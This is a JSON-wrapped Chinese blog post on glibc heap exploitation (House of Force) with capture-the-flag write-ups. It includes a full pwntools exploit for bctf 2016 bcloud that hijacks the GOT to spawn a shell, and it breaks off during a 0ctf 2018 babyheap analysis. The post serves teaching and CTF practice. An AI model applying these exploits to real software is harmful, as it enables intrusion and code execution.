{"total":8,"pageSize":10,"pageCount":1,"data":[{"title":"Top Chunk利用","slug":"Top Chunk利用","date":"2019-04-21T02:58:07.000Z","updated":"2019-04-21T03:19:46.757Z","comments":true,"path":"api/articles/Top Chunk利用.json","excerpt":"","keywords":null,"cover":null,"content":"<p>本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。</p>\n<h2 id=\"House-of-force（Top-chunk劫持）\"><a href=\"#House-of-force（Top-chunk劫持）\" class=\"headerlink\" title=\"House of force（Top chunk劫持）\"></a>House of force（Top chunk劫持）</h2><h3 id=\"top-chunk的分割机制与利用点\"><a href=\"#top-chunk的分割机制与利用点\" class=\"headerlink\" title=\"top chunk的分割机制与利用点\"></a>top chunk的分割机制与利用点</h3><p>众所周知，top chunk的作用是作为后备堆空间，在各bin中没有chunk可提供时，分割出一个chunk提供给用户。那么这个分割过程是怎样的呢？我们来看一份源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim = av-&gt;top;</span><br><span class=\"line\">size   = chunksize(victim);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (size) &gt;= (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (nb + MINSIZE)) <span class=\"comment\">//检查请求size是否可以分配</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    remainder_size = size - nb; <span class=\"comment\">// 分配后size，此处nb为有符号数</span></span><br><span class=\"line\">    remainder      = chunk_at_offset(victim, nb); <span class=\"comment\">// 分配后指针</span></span><br><span class=\"line\">    av-&gt;top        = remainder; <span class=\"comment\">// top = 分配后的指针</span></span><br><span class=\"line\">    set_head(victim, nb | PREV_INUSE | <span class=\"comment\">// 设置PREV_INUSE和NON_MAIN_ARENA</span></span><br><span class=\"line\">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>)); </span><br><span class=\"line\">    set_head(remainder, remainder_size | PREV_INUSE); <span class=\"comment\">//设置top</span></span><br><span class=\"line\"></span><br><span class=\"line\">    check_malloced_chunk(av, victim, nb);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = chunk2mem(victim);</span><br><span class=\"line\">    alloc_perturb(p, bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先是libc会检查用户申请的大小，top chunk是否能给的起，如果给得起，就由top chunk的head处，以用户申请大小所匹配的chunk大小为偏移量，将top chunk的位置推到新的位置，而原来的top chunk head处就作为新的堆块被分配给用户了</p>\n<p>试想，如果我们能控制top chunk在这个过程中推到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将top chunk劫持到任意内存地址，然后就可以控制目标内存。</p>\n<p>一般来说，pwn中劫持控制流常常取malloc_hook, got表等指针，与堆空间中的top chunk相聚甚远，远到所需要申请的size必定超过top chunk现有的大小，无法控制if条件的检查。</p>\n<p>但是，我们看到if条件检查时size被强制转换为unsigned long，所以如果我们将size溢出覆盖为0xffffffff（-1），那么我们可以任意申请。此外，虽然此处的检查中，用户申请的大小也被当作无符号整数对待，但是在后面推top chunk的时候是以int对待的，所以可以劫持到低地址，加负数。</p>\n<h3 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><ul>\n<li>用户可以修改top chunk的size字段</li>\n<li>用户可以申请任意大小的堆内存（包括负数）</li>\n</ul>\n<h2 id=\"bctf-2016-bcloud\"><a href=\"#bctf-2016-bcloud\" class=\"headerlink\" title=\"bctf 2016 bcloud\"></a>bctf 2016 bcloud</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/pwn/heap/house-of-force/2016_bctf_bcloud$ checksec bcloud</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/pwn/heap/house-of-force/2016_bctf_bcloud/bcloud&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>没有开启PIE，RELRO也只开了一部分，所以可以劫持got表，同时注意是一道32位的题。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>main函数一开始在设置缓冲区之后，会调用init_bloud函数，首先要求输入名字，然后malloc(0x40)，将指针放在bss段上的name处，然后输出name中的数据。</p>\n<p>然后会调用init_org_host函数，输入org和host，都放在bss段上。</p>\n<h4 id=\"init-org-host\"><a href=\"#init-org-host\" class=\"headerlink\" title=\"init_org_host\"></a>init_org_host</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">init_org_host</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v2; <span class=\"comment\">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v3; <span class=\"comment\">// [esp+60h] [ebp-58h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v4; <span class=\"comment\">// [esp+A4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [esp+ACh] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x90</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Org:\"</span>);</span><br><span class=\"line\">  read_str(&amp;s, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Host:\"</span>);</span><br><span class=\"line\">  read_str(&amp;v3, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>u); <span class=\"comment\">// chunkptr1</span></span><br><span class=\"line\">  v2 = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>u); <span class=\"comment\">// chunkptr2</span></span><br><span class=\"line\">  org = v2;</span><br><span class=\"line\">  host = v4;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v4, &amp;v3);<span class=\"comment\">// 从v3地址起复制</span></span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v2, &amp;s); <span class=\"comment\">// 从s地址起复制到v2，越界。</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"OKay! Enjoy:)\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先向栈中s处开始写0x40，然后向v3处写0x40，如果都写满0x40个字节，在malloc v4和v2的时候，会把那一个\\x00覆盖掉，导致从栈中s处copy栈上数据一直到v3的填充结束。这里是典型的由于strcpy函数的不安全性导致的错误。</p>\n<h4 id=\"read-str\"><a href=\"#read-str\" class=\"headerlink\" title=\"read_str\"></a>read_str</h4><p>这里read_str函数中存在漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">read_str</span><span class=\"params\">(<span class=\"keyword\">char</span> *s, <span class=\"keyword\">int</span> len, <span class=\"keyword\">char</span> stop)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+1Bh] [ebp-Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; len; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">1u</span>) &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( buf == stop )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    s[i] = buf;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  s[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当碰到\\n时会停止循环，如果读入完整长度，最后会多覆盖一个\\x00。</p>\n<h4 id=\"new-note\"><a href=\"#new-note\" class=\"headerlink\" title=\"new_note\"></a>new_note</h4><p>通过bss段上的notelist全局数组管理堆块，每次malloc输入的size+4，size存在notesize上，然后读入内容，最后把相应的issync数组项置为0。</p>\n<h4 id=\"show-note\"><a href=\"#show-note\" class=\"headerlink\" title=\"show_note\"></a>show_note</h4><p>假的，无法使用。</p>\n<h4 id=\"edit-note\"><a href=\"#edit-note\" class=\"headerlink\" title=\"edit_note\"></a>edit_note</h4><p>输入id，从notelist上取出相应chunk的指针，然后将对应id的issync置为0，最后根据存储的size进行edit</p>\n<h4 id=\"delete-note\"><a href=\"#delete-note\" class=\"headerlink\" title=\"delete_note\"></a>delete_note</h4><p>输入id，将notelist和notesize全部置为0，再free。</p>\n<h4 id=\"syn\"><a href=\"#syn\" class=\"headerlink\" title=\"syn\"></a>syn</h4><p>将issync前十位都置为1。</p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"leak-heap\"><a href=\"#leak-heap\" class=\"headerlink\" title=\"leak heap\"></a>leak heap</h4><p>只要在输入name时输入0x40的数据即可泄漏出heap地址，因为堆块内存和堆块地址在栈上相邻。</p>\n<h4 id=\"修改top-chunk的size\"><a href=\"#修改top-chunk的size\" class=\"headerlink\" title=\"修改top chunk的size\"></a>修改top chunk的size</h4><p>调试得到top chunk的size会被org的前4个byte覆盖。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x8178008, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x8178050, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178050     63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63    cccccccccccccccc]</span><br><span class=\"line\">Chunk(addr=0x8178098, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]</span><br><span class=\"line\">Chunk(addr=0x81780e0, size=0x63636360, flags=PREV_INUSE|IS_MMAPPED)  ←  top chunk</span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  x/64x 0x08178050</span><br><span class=\"line\">0x8178050:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178060:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178070:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178080:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178090:\t0x00000000\t0x00000049\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780a0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780b0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780c0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780d0:\t0x62626262\t0x62626262\t0x08178098\t0x63636363</span><br><span class=\"line\">0x81780e0:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x81780f0:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178100:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178110:\t0x63636363\t0x63636363\t0x63636363\t0x00000000</span><br><span class=\"line\">0x8178120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x8178130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x8178140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p.recvuntil(<span class=\"string\">\"Org:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Host:\\n\"</span>)</span><br><span class=\"line\">p.sendline(p32(<span class=\"number\">0xffffffff</span>) + <span class=\"string\">\"c\"</span> * <span class=\"number\">0x3c</span>)</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x877b008, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x877b050, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b050     ff ff ff ff 63 63 63 63 63 63 63 63 63 63 63 63    ....cccccccccccc]</span><br><span class=\"line\">Chunk(addr=0x877b098, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]</span><br><span class=\"line\">Chunk(addr=0x877b0e0, size=0xfffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  top chunk</span><br></pre></td></tr></table></figure>\n<p>所以就可以实现任意写了</p>\n<h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>由于程序中没有leak的功能，我们要实现leak libc，需要劫持某个got表为最一开始打印用户名的函数，而且这个libc函数的参数还需要我们能控制，所以我们只能选择free函数。</p>\n<p>因为程序是通过notelist管理chunk，所以只要我们劫持了notelist，也就可以实现任意地址读写。</p>\n<p>所以我们将chunk分配到notelist之前，然后依次修改notelist上前几项为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puts@got # 0</span><br><span class=\"line\">free@got # 1</span><br><span class=\"line\">&amp;notelist[3] # 2</span><br><span class=\"line\">/bin # 3</span><br><span class=\"line\">/sh\\x00 4</span><br></pre></td></tr></table></figure>\n<p>首先edit(1)，劫持free@got为info函数，然后delete(0)，即可leak出libc。</p>\n<h4 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h4><p>然后edit(1)，劫持free@got为system，最后delte(2)即可getshell。</p>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bcloud\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./bcloud\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"note content:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"the content:\\n\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate__</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"note content:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"id:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"content:\\n\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"id:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">info = <span class=\"number\">0x8048779</span></span><br><span class=\"line\">notelist = <span class=\"number\">0x804b120</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">heap_addr = u32(p.recvuntil(<span class=\"string\">\"!\"</span>)[<span class=\"number\">-5</span>:<span class=\"number\">-1</span>]) - <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change top chunk</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Org:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Host:\\n\"</span>)</span><br><span class=\"line\">p.send(p32(<span class=\"number\">0xffffffff</span>) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># malloc to notelist</span></span><br><span class=\"line\">offset = (notelist - <span class=\"number\">0x8</span>) - (heap_addr + <span class=\"number\">0xd8</span>) - <span class=\"number\">0x8</span></span><br><span class=\"line\">allocate__(offset) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(elf.got[<span class=\"string\">'puts'</span>]) <span class=\"comment\">#0</span></span><br><span class=\"line\">payload += p32(elf.got[<span class=\"string\">'free'</span>]) <span class=\"comment\"># 1</span></span><br><span class=\"line\">payload += p32(notelist + <span class=\"number\">0x4</span> * <span class=\"number\">3</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span> <span class=\"comment\"># 3 4</span></span><br><span class=\"line\">allocate(len(payload), payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">update(<span class=\"number\">1</span>, p32(info) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">puts_got = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = puts_got - libc.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">update(<span class=\"number\">1</span>, p32(system) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0ctf-2018-babyheap\"><a href=\"#0ctf-2018-babyheap\" class=\"headerlink\" title=\"0ctf 2018 babyheap\"></a>0ctf 2018 babyheap</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/pwn/baby-heap-2018$ checksec babyheap</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/pwn/baby-heap-2018/babyheap&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>全防护</p>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><h4 id=\"allocate\"><a href=\"#allocate\" class=\"headerlink\" title=\"allocate\"></a>allocate</h4><p>​    最多16个chunk，size不大于0x58，每次calloc之后将list数组上对应位置的inuse置1，并存储size和chunkptr，但是并没有写入chunk的内容。</p>\n<h4 id=\"update\"><a href=\"#update\" class=\"headerlink\" title=\"update\"></a>update</h4><p>​    输入Index和一个size，然后如果输入的size小于等于原来的size+1，就可以以输入的size向堆上写，也就是这里存在off by one漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span 